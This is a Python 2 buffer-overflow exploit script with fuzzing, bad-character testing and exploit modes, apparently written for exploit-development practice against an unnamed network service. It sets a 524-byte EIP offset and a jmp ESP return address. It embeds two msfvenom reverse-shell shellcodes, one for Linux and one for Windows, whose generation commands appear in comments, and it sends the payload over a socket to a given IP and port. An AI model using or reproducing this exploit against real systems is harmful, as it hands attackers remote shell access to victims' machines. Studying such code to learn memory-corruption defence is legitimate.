#!/usr/bin/python
#coding: utf-8

import socket, sys
from struct import pack

if len(sys.argv) < 4 or "-h" == sys.argv[1]:
    print "Usage: exploit.py <action:[fuzz|badchars|exploit]> <ip-address> <port>"
    sys.exit(0)

action = sys.argv[1]
ip_address = sys.argv[2]
rport = int(sys.argv[3])

steps = 1

offset = 524  #change it once you find eip offset
esp = 0x311712F3 #jmp ESP


badchars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")


#msfvenom -p linux/x86/shell/reverse_tcp LHOST=<your-ip> LPORT=<your-port> -b "\x00\x0a" -f python
shellcoderemote=("\xba\x41\xb5\xbc\x9f\xda\xdc\xd9\x74\x24\xf4\x58\x2b"
"\xc9\xb1\x12\x31\x50\x12\x83\xe8\xfc\x03\x11\xbb\x5e"
"\x6a\xa0\x18\x69\x76\x91\xdd\xc5\x13\x17\x6b\x08\x53"
"\x71\xa6\x4b\x07\x24\x88\x73\xe5\x56\xa1\xf2\x0c\x3e"
"\x38\x0e\xed\x4d\x54\x12\xf1\x98\x7d\x9b\x10\x6a\x1b"
"\xcc\x83\xd9\x57\xef\xaa\x3c\x5a\x70\xfe\xd6\x0b\x5e"
"\x8c\x4e\xbc\x8f\x5d\xec\x55\x59\x42\xa2\xf6\xd0\x64"
"\xf2\xf2\x2f\xe6")


#msfvenom -p windows/shell_reverse_tcp LHOST=<your-ip> EXITFUNC=thread LPORT=<your-port> -b "\x00\x0a" -a x86 --platform windows -e x86/shikata_ga_nai -f c
shellcodelocal=("\xdb\xca\xd9\x74\x24\xf4\xba\x89\x54\x1d\xcb\x58\x2b\xc9\xb1"
"\x52\x31\x50\x17\x83\xc0\x04\x03\xd9\x47\xff\x3e\x25\x8f\x7d"
"\xc0\xd5\x50\xe2\x48\x30\x61\x22\x2e\x31\xd2\x92\x24\x17\xdf"
"\x59\x68\x83\x54\x2f\xa5\xa4\xdd\x9a\x93\x8b\xde\xb7\xe0\x8a"
"\x5c\xca\x34\x6c\x5c\x05\x49\x6d\x99\x78\xa0\x3f\x72\xf6\x17"
"\xaf\xf7\x42\xa4\x44\x4b\x42\xac\xb9\x1c\x65\x9d\x6c\x16\x3c"
"\x3d\x8f\xfb\x34\x74\x97\x18\x70\xce\x2c\xea\x0e\xd1\xe4\x22"
"\xee\x7e\xc9\x8a\x1d\x7e\x0e\x2c\xfe\xf5\x66\x4e\x83\x0d\xbd"
"\x2c\x5f\x9b\x25\x96\x14\x3b\x81\x26\xf8\xda\x42\x24\xb5\xa9"
"\x0c\x29\x48\x7d\x27\x55\xc1\x80\xe7\xdf\x91\xa6\x23\xbb\x42"
"\xc6\x72\x61\x24\xf7\x64\xca\x99\x5d\xef\xe7\xce\xef\xb2\x6f"
"\x22\xc2\x4c\x70\x2c\x55\x3f\x42\xf3\xcd\xd7\xee\x7c\xc8\x20"
"\x10\x57\xac\xbe\xef\x58\xcd\x97\x2b\x0c\x9d\x8f\x9a\x2d\x76"
"\x4f\x22\xf8\xd9\x1f\x8c\x53\x9a\xcf\x6c\x04\x72\x05\x63\x7b"
"\x62\x26\xa9\x14\x09\xdd\x3a\xdb\x66\xdd\xaf\xb3\x74\xdd\xe6"
"\x9b\xf0\x3b\x92\x0b\x55\x94\x0b\xb5\xfc\x6e\xad\x3a\x2b\x0b"
"\xed\xb1\xd8\xec\xa0\x31\x94\xfe\x55\xb2\xe3\x5c\xf3\xcd\xd9"
"\xc8\x9f\x5c\x86\x08\xe9\x7c\x11\x5f\xbe\xb3\x68\x35\x52\xed"
"\xc2\x2b\xaf\x6b\x2c\xef\x74\x48\xb3\xee\xf9\xf4\x97\xe0\xc7"
"\xf5\x93\x54\x98\xa3\x4d\x02\x5e\x1a\x3c\xfc\x08\xf1\x96\x68"
"\xcc\x39\x29\xee\xd1\x17\xdf\x0e\x63\xce\xa6\x31\x4c\x86\x2e"
"\x4a\xb0\x36\xd0\x81\x70\x56\x33\x03\x8d\xff\xea\xc6\x2c\x62"
"\x0d\x3d\x72\x9b\x8e\xb7\x0b\x58\x8e\xb2\x0e\x24\x08\x2f\x63"
"\x35\xfd\x4f\xd0\x36\xd4")


def fuzz():
    junk = "A" * 100
    junkaux = junk
    while True:
        print "Testing {} byte payload".format(len(junkaux))
        sendpayload(junkaux)
        junkaux += junk

def testbadchars():
    payload = "A"*offset + "B"*4 + badchars
    sendpayload(payload)

def exploit():
    junk = "A"*offset

    jmp_esp = pack("<L", esp)

    #nops = "\x90"*16
    opcode = "\x83\xEC\x10"

    payload = junk + jmp_esp + opcode + shellcoderemote
    sendpayload(payload)
        
        
        
def sendpayload(payload):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip_address, rport))

        data = s.recv(1024)
        
        s.send(payload+"\r\n")
        data = s.recv(1024)

    except:
        print "Connection dropped"
        sys.exit(1)
    


if __name__ == '__main__':

    if "fuzz" == action:
        fuzz()
    elif "exploit" == action:
        exploit()
    elif "badchars" == action:
        testbadchars()
    else:
        print "Usage: exploit.py <action:[fuzz|badchars|exploit]> <ip-address> <port>"
